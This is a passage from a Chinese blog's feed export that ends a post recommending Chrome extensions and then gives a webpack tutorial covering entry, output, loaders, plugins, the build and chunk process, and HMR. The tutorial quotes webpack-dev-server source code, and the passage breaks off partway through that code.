src="https://tva1.sinaimg.cn/large/008eGmZEly1gmjja5k266j31gm0u0k4q.jpg" alt="image-20210111101228476"></p><h3 id="下载地址-5"><a href="#下载地址-5" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="https://chrome.google.com/webstore/detail/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0%E7%BD%91%E9%A1%B5%E5%89%AA%E6%8A%A5/joinpgckiioeklibflapokicmndlcnef" target="_blank" rel="noopener">传送门</a></p><h2 id="广告终结者"><a href="#广告终结者" class="headerlink" title="广告终结者"></a>广告终结者</h2><h3 id="简介-6"><a href="#简介-6" class="headerlink" title="简介"></a>简介</h3><p>清除网页上的所有广告：浮动广告，购物广告，恶意弹窗，跟踪代码。让你浏览网页更快更清爽。广告终结者，你唯一需要的广告插件</p><p>广告终结者是什么？<br>    广告终结者是一款参考各种广告过滤插件开发的功能全面的免费开源广告过滤工具。广告终结者让你不用再忍受网页上烦人的广告，不需要开通所谓的VIP，做任务，也不需要找各种功能不全的广告插件，广告终结者集成广告过滤的所有功能，是你唯一需要的必备广告过滤扩展。</p><h3 id="插件预览-6"><a href="#插件预览-6" class="headerlink" title="插件预览"></a>插件预览</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmjjfcuw45j31cf0u016r.jpg" alt="image-20210111101748781"></p><h3 id="下载地址-6"><a href="#下载地址-6" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="https://chrome.google.com/webstore/detail/%E5%B9%BF%E5%91%8A%E7%BB%88%E7%BB%93%E8%80%85/fpdnjdlbdmifoocedhkighhlbchbiikl" target="_blank" rel="noopener">传送门</a></p><h2 id="Octotree-GitHub-code-tree"><a href="#Octotree-GitHub-code-tree" class="headerlink" title="Octotree - GitHub code tree"></a>Octotree - GitHub code tree</h2><h3 id="简介-7"><a href="#简介-7" class="headerlink" title="简介"></a>简介</h3><p>GitHub爱好者的实用软件，直接展示GitHub项目的目录结构，非常方便的查找代码。</p><h3 id="插件预览-7"><a href="#插件预览-7" class="headerlink" title="插件预览"></a>插件预览</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmjjn6mm0sj31d50u0au7.jpg" alt="image-20210111102520453"></p><h3 id="下载地址-7"><a href="#下载地址-7" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="https://chrome.google.com/webstore/detail/octotree-github-code-tree/bkhaagjahfmjljalopjnoealnfndnagc" target="_blank" rel="noopener">传送门</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webpack浅入深出</title>
      <link href="2021/02/02/webpack%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA/"/>
      <url>2021/02/02/webpack%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn22y1ijztj30uf0ccdh6.jpg" alt="image-20210127111317254"></p><h2 id="基础知识回顾"><a href="#基础知识回顾" class="headerlink" title="基础知识回顾"></a>基础知识回顾</h2><ul><li><p><a href="https://webpack.docschina.org/concepts/#entry" target="_blank" rel="noopener">入口(entry)</a></p><pre class="line-numbers language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  entry<span class="token punctuation">:</span> <span class="token string">'./path/to/my/entry/file.js'</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//或者</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  entry<span class="token punctuation">:</span> <span class="token punctuation">{</span>    main<span class="token punctuation">:</span> <span class="token string">'./path/to/my/entry/file.js'</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><ul><li><p><a href="https://webpack.docschina.org/concepts/#output" target="_blank" rel="noopener">输出(output)</a></p><pre class="line-numbers language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    filename<span class="token punctuation">:</span><span class="token string">'[name][chunkhash:8].js'</span><span class="token punctuation">,</span>    path<span class="token punctuation">:</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span><span class="token string">'dist'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><a href="https://webpack.docschina.org/concepts/#loaders" target="_blank" rel="noopener">loader</a><br><strong>预处理loader</strong>  </p><ul><li>css-loader 处理css中路径引用等问题</li><li>style-loader 动态把样式写入css</li><li>sass-loader scss编译器</li><li>less-loader less编译器</li><li>postcss-loader scss再处理  </li></ul><p><strong>处理js loader</strong>  </p><ul><li>babel-loader</li><li>jsx-loader</li><li>ts-loader</li></ul><p><strong>图片处理loader</strong></p><ul><li>url-loader</li></ul></li><li><p><a href="https://webpack.docschina.org/concepts/#plugins" target="_blank" rel="noopener">插件(plugin)</a><br><code>plugins</code>里面放的是插件，插件的作用在于提高开发效率，能够解放双手，让我们去做更多有意义的事情。一些很low的事就统统交给插件去完成。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> webpackConfig <span class="token operator">=</span> <span class="token punctuation">{</span>    plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token comment" spellcheck="true">//清除文件</span>        <span class="token keyword">new</span> <span class="token class-name">CleanWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">//css单独打包</span>        <span class="token keyword">new</span> <span class="token class-name">MiniCssExtractPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            filename<span class="token punctuation">:</span> <span class="token string">"[name].css"</span><span class="token punctuation">,</span>            chunkFilename<span class="token punctuation">:</span> <span class="token string">"[name].css"</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 引入热更新插件</span>        <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>HotModuleReplacementPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><a href="https://webpack.docschina.org/concepts/#mode" target="_blank" rel="noopener">模式(mode)</a></p><ul><li>production 生产环境</li></ul></li><li><p>development 开发环境</p><ul><li>提升了构建速度</li><li>默认为开发环境，不需要专门配置</li><li>提供压缩功能，不需要借助插件</li><li>提供<code>SouceMap</code>，不需要专门配置</li></ul></li><li><p><a href="https://webpack.docschina.org/concepts/#browser-compatibility" target="_blank" rel="noopener">浏览器兼容性(browser compatibility)</a></p></li><li><p><a href="https://webpack.docschina.org/concepts/#environment" target="_blank" rel="noopener">环境(environment)</a></p></li></ul><p><a href="https://segmentfault.com/a/1190000019998714" target="_blank" rel="noopener">项目中详细配置</a></p><h2 id="构建过程"><a href="#构建过程" class="headerlink" title="构建过程"></a>构建过程</h2><p>Webpack 处理应用程序时，它会递归地构建一个依赖关系图(<code>dependency graph</code>)，其中包含应用程序需要的每个模块，然后将所有模块打包成一个或多个 <code>bundle</code></p><p>其实就是：Webpack 是一个 JS 代码打包器。</p><p>至于图片、CSS、Less、TS等其他文件，就需要 Webpack 配合 loader 或者 plugin 功能来实现。</p><h3 id="构建流程"><a href="#构建流程" class="headerlink" title="构建流程"></a>构建流程</h3><ol><li>根据配置，识别入口文件；</li><li>逐层识别模块依赖（包括 Commonjs、AMD、或 ES6 的 import 等，都会被识别和分析）；</li><li>Webpack 主要工作内容就是分析代码，转换代码，编译代码，最后输出代码；</li><li>输出最后打包后的代码。</li></ol><p>webpack构建的三个阶段： </p><ol><li>初始化阶段</li><li>编译阶段</li><li>输出阶段 </li></ol><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ul><li><p>初始化参数: 从配置文件和 Shell 语句中读取与合并参数，得出最终的参数。这个过程中还会执行配置文件中的插件实例化语句 new Plugin()。</p></li><li><p>初始化默认参数配置: new WebpackOptionsDefaulter().process(options)</p></li><li><p>实例化Compiler对象:用上一步得到的参数初始化Compiler实例，Compiler负责文件监听和启动编译。Compiler实例中包含了完整的Webpack配置，全局只有一个Compiler实例。</p></li><li><p>加载插件: 依次调用插件的apply方法，让插件可以监听后续的所有事件节点。同时给插件传入compiler实例的引用，以方便插件通过compiler调用Webpack提供的API。</p></li><li><p>处理入口: 读取配置的Entrys，为每个Entry实例化一个对应的EntryPlugin，为后面该Entry的递归解析工作做准备</p></li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><h4 id="1、生成chunk"><a href="#1、生成chunk" class="headerlink" title="1、生成chunk"></a>1、生成chunk</h4><p>chunk是webpack内部运行时的概念；一个chunk是对依赖图的部分进行封装的结果（``Chunk<code>the class is the encapsulation for parts of your dependency graph</code>）；可以通过多个entry-point来生成一个chunk<br>chunk可以分为三类;</p><ul><li>entry chunk<ul><li>包含webpack runtime code并且是最先执行的chunk</li></ul></li><li>initial chunk<ul><li>包含同步加载进来的module且不包含runtime code的chunk</li><li>在entry chunk执行后再执行的</li></ul></li><li>normal chunk<ul><li>使用<code>require.ensure</code>、<code>System.import</code>、<code>import()</code>异步加载进来的<code>module</code>，会被放到normal chunk中</li></ul></li></ul><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn2d2eegeaj30ps0fkgm8.jpg" alt="image-20210127170328144" style="zoom:50%;">  <p>每个chunk都至少有一个属性：</p><ul><li>name: 默认为main</li><li>id: 唯一的编号，开发环境和name相同，生产环境是一个数字，从0开始</li></ul><h4 id="2、构建依赖模块"><a href="#2、构建依赖模块" class="headerlink" title="2、构建依赖模块"></a>2、构建依赖模块</h4><blockquote><p>var compiler = webpack(options);</p></blockquote><p><img src="https://img.58cdn.com.cn/escstatic/docs/images/1594808617828.52.36.png" alt="屏幕快照 2020-07-15 15.52.36.png"></p><p>从入口文件index.js开始分析，检查右侧表格中的记录，如果有记录就结束。没有记录就继续读取文件内容，读取完文件内容后，开始进行抽象树语法分析，将代码字符串转换成一个对象的描述文件。并将其中的依赖保存在dependencies数组中</p><pre class="line-numbers language-js"><code class="language-js">dependencies：<span class="token punctuation">[</span><span class="token string">"./src/a.js"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>保存完以后，替换依赖函数</p><pre class="line-numbers language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"index.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">_webpack_reuqire</span><span class="token punctuation">(</span><span class="token string">"./src/a.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将转换后的代码字符串保存在右侧的表格中</p><table><thead><tr><th>模块id</th><th>转换后的代码</th></tr></thead><tbody><tr><td>./src/index.js</td><td>console.log(“index.js”);_webpack_reuqire(“./src/a.js”);</td></tr></tbody></table><p>因为dependencies中有数据，开始递归解析dependencies中的数据。取出.src/a.js</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// .src/a.js</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"a.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查看右侧表格，发现没有a.js，开始读取文件内容，生成ast抽象语法树，将依赖记录在数组中</p><pre class="line-numbers language-js"><code class="language-js">dependencies<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"./src/b.js"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后替换函数依赖</p><pre class="line-numbers language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"a.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">_webpack_require</span><span class="token punctuation">(</span><span class="token string">"./src/b.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token string">"a"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将转换后的代码记录在右侧的表格中</p><table><thead><tr><th>模块id</th><th>转换后的代码</th></tr></thead><tbody><tr><td>./src/index.js</td><td>console.log(“index.js”);_webpack_reuqire(“./src/a.js”);</td></tr><tr><td>./src/a.js</td><td>console.log(“a.js”);_webpack_require(“./src/b.js”);module.exports = “a”</td></tr></tbody></table><p>然后继续取出来dependencies的内容./src/b.js</p><pre class="line-numbers language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"b.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token string">"b"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>发现右侧表格中没有b.js这个文件，就继续读取文件内容，进行ast抽象语法树分析，发现没有依赖项，就不需要往数组中放东西，也不需要替换依赖项，将代码字符串存在表格中</p><table><thead><tr><th>模块id</th><th>转换后的代码</th></tr></thead><tbody><tr><td>./src/index.js</td><td>console.log(“index.js”);_webpack_reuqire(“./src/a.js”);</td></tr><tr><td>./src/a.js</td><td>console.log(“a.js”);_webpack_require(“./src/b.js”);module.exports = “a”</td></tr><tr><td>./src/b.js</td><td>console.log(“b.js”);module.exports = “b”;</td></tr></tbody></table><p>然后递归回去，发现index下产生的数组是空，整个文件依赖就解析完毕</p><h4 id="3、产生chunk-assets"><a href="#3、产生chunk-assets" class="headerlink" title="3、产生chunk assets"></a>3、产生chunk assets</h4><p>在第二步完成以后，chunk中会产生一个模块列表，列表中包含了<strong>模块id</strong>和<strong>模块转换后的代码</strong></p><p>接下来，webpack会根据配置为chunk生成一个<strong>资源列表</strong>，即<code>chunk assets</code>,资源列表可以理解为是生成到最终文件的文件名和文件内容</p><ul><li>为什么叫资源列表呢？</li><li>因为有可能配置devtool生成的除了./dist/main.js还有./dist/main.js.map</li></ul><p>即：文件名：./dist/main.js</p><p>文件内容：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">"./src/index.js"</span><span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//是否是eval可以根据devtool来设置，有很多种方式</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"console.log(\"index module\");\nvar a = __webpack_require__(/*! ./a */ \"./src/a.js\"); \na.abc();\nconsole.log(a);\n\n\n//# sourceURL=webpack:///./src/index.js?"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img.58cdn.com.cn/escstatic/docs/images/1594808697230.04.09.png" alt="屏幕快照 2020-07-15 17.04.09.png"></p><blockquote><p>chunk hash: 是根据所有的chunk assets的内容生成的一个hash字符串<br>hash: 一种算法，具有很多分类。特点是将一个任意长度的字符串转换成一个固定长度的字符串，而且可以保证原始内容不变</p></blockquote><p>就是将我们上面生成的文件内容，全部联合起来，然后生成一个固定长度的哈希值链接</p><p>简图： <img src="https://img.58cdn.com.cn/escstatic/docs/images/1594808723385.13.36.png" alt="屏幕快照 2020-07-15 17.13.36.png"></p><p>多个chunk assets就是一个bundle（一捆）</p><h4 id="4、合并chunk-assets"><a href="#4、合并chunk-assets" class="headerlink" title="4、合并chunk assets"></a>4、合并chunk assets</h4><p>将多个chunk的assets合并到一起，并产生一个总的hash <img src="https://img.58cdn.com.cn/escstatic/docs/images/1594808750383.16.11.png" alt="屏幕快照 2020-07-15 17.16.11.png"></p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>webpack将利用node中的fs模块（文件处理模块），根据编译产生的总的assets，生成相应的文件</p><p><img src="https://img.58cdn.com.cn/escstatic/docs/images/1594804932479.22.03.png" alt="屏幕快照 2020-07-15 17.22.03.png"></p><h3 id="涉及术语"><a href="#涉及术语" class="headerlink" title="涉及术语"></a>涉及术语</h3><ol><li>module: 模块，分割的代码单元，webpack中的模块可以是任何内容的文件，不仅限于JS</li><li>chunk: webpack内部构建模块的块，一个chunk中包含多个模块，这些模块是从入口模块通过依赖分析得来的</li><li>bundle：chunk构建好模块后会生成chunk的资源清单，清单中的每一项就是一个bundle，可以认为bundle就是最终生成的文件</li><li>hash：最终的资源清单所有内容联合生成的hash值</li><li>chunkhash: chunk生成的资源清单内容联合生成的hash值</li><li>chunkname：chunk的名称，如果没有配置则使用main</li><li>id: 通常指chunk的唯一编号，如果在开发环境下构建，和chunkname相同；如果是生产环境下构建，则使用一个从0开始的数字进行编号</li></ol><h2 id="HMR热更新原理"><a href="#HMR热更新原理" class="headerlink" title="HMR热更新原理"></a>HMR热更新原理</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Hot Module Replacement（以下简称：HMR 模块热替换）是 Webpack 提供的一个非常有用的功能，<strong>它允许在 JavaScript 运行时更新各种模块，而无需完全刷新</strong>。</p><p>当我们修改代码并保存后，Webpack 将对代码重新打包，HMR 会在应用程序运行过程中替换、添加或删除模块，而无需重新加载整个页面。<br>HMR 主要通过以下几种方式，来显著加快开发速度：</p><ul><li>保留在完全重新加载页面时丢失的应用程序状态；</li><li>只更新变更内容，以节省宝贵的开发时间；</li><li>调整样式更加快速 - 几乎相当于在浏览器调试器中更改样式。</li></ul><h3 id="服务启动"><a href="#服务启动" class="headerlink" title="服务启动"></a>服务启动</h3><p>webpack-dev-server：不是一个插件，而是一个web服务器  </p><p><strong>服务启动流程</strong></p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3dt3473mj31ld0u0guk.jpg" alt="image-20210128141442540">  </p><p><strong>webpack-dev-server源码解析</strong>  </p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//启动服务的具体方法</span><span class="token keyword">function</span> <span class="token function">startDevServer</span><span class="token punctuation">(</span>config<span class="token punctuation">,</span> options<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> log <span class="token operator">=</span> <span class="token function">createLogger</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//声明全局webpack实例</span>  <span class="token keyword">let</span> compiler<span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    compiler <span class="token operator">=</span> <span class="token function">webpack</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err <span class="token keyword">instanceof</span> <span class="token class-name">webpack<span class="token punctuation">.</span>WebpackOptionsValidationError</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>colors<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>stats<span class="token punctuation">.</span>colors<span class="token punctuation">,</span> err<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// eslint-disable-next-line no-process-exit</span>      process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">throw</span> err<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//创建server服务</span>    server <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Server</span><span class="token punctuation">(</span>compiler<span class="token punctuation">,</span> options<span class="token punctuation">,</span> log<span class="token punctuation">)</span><span class="token punctuation">;</span>    serverData<span class="token punctuation">.</span>server <span class="token operator">=</span> server<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">.</span>name <span class="token operator">===</span> <span class="token string">'ValidationError'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>colors<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>stats<span class="token punctuation">.</span>colors<span class="token punctuation">,</span> err<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// eslint-disable-next-line no-process-exit</span>      process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">throw</span> err<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>socket<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//设置服务监听</span>    server<span class="token punctuation">.</span>listeningApp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token string">'EADDRINUSE'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//使用socket建立长连接</span>        <span class="token comment" spellcheck="true">//初始化socket</span>        <span class="token keyword">const</span> clientSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">net<span class="token punctuation">.</span>Socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        clientSocket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token string">'ECONNREFUSED'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// No other server listening on this socket so it can be safely removed</span>            fs<span class="token punctuation">.</span><span class="token function">unlinkSync</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>socket<span class="token punctuation">)</span><span class="token punctuation">;</span>            server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>socket<span class="token punctuation">,</span> options<span class="token punctuation">.</span>host<span class="token punctuation">,</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> error<span class="token punctuation">;</span>              <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        clientSocket<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">{</span> path<span class="token punctuation">:</span> options<span class="token punctuation">.</span>socket <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'This socket is already used'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>socket<span class="token punctuation">,</span> options<span class="token punctuation">.</span>host<span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> err<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// chmod 666 (rw rw rw)</span>      <span class="token keyword">const</span> READ_WRITE <span class="token operator">=</span> <span class="token number">438</span><span class="token punctuation">;</span>      fs<span class="token punctuation">.</span><span class="token function">chmod</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>socket<span class="token punctuation">,</span> READ_WRITE<span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">throw</span> err<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>port<span class="token punctuation">,</span> options<span class="token punctuation">.</span>host<span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> err<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//启动webpack-dev-server服务器</span><span class="token function">processOptions</span><span class="token punctuation">(</span>config<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token punctuation">(</span>config<span class="token punctuation">,</span> options<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token function">startDevServer</span><span class="token punctuation">(</span>config<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>server.js源码解析</strong></p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Server</span> <span class="token punctuation">{</span>  <span class="token function">constructor</span><span class="token punctuation">(</span>compiler<span class="token punctuation">,</span> options <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> _log<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token operator">...</span>    <span class="token comment" spellcheck="true">//构造函数初始化服务</span>  <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//创建初始化express应用</span>  <span class="token function">setupApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  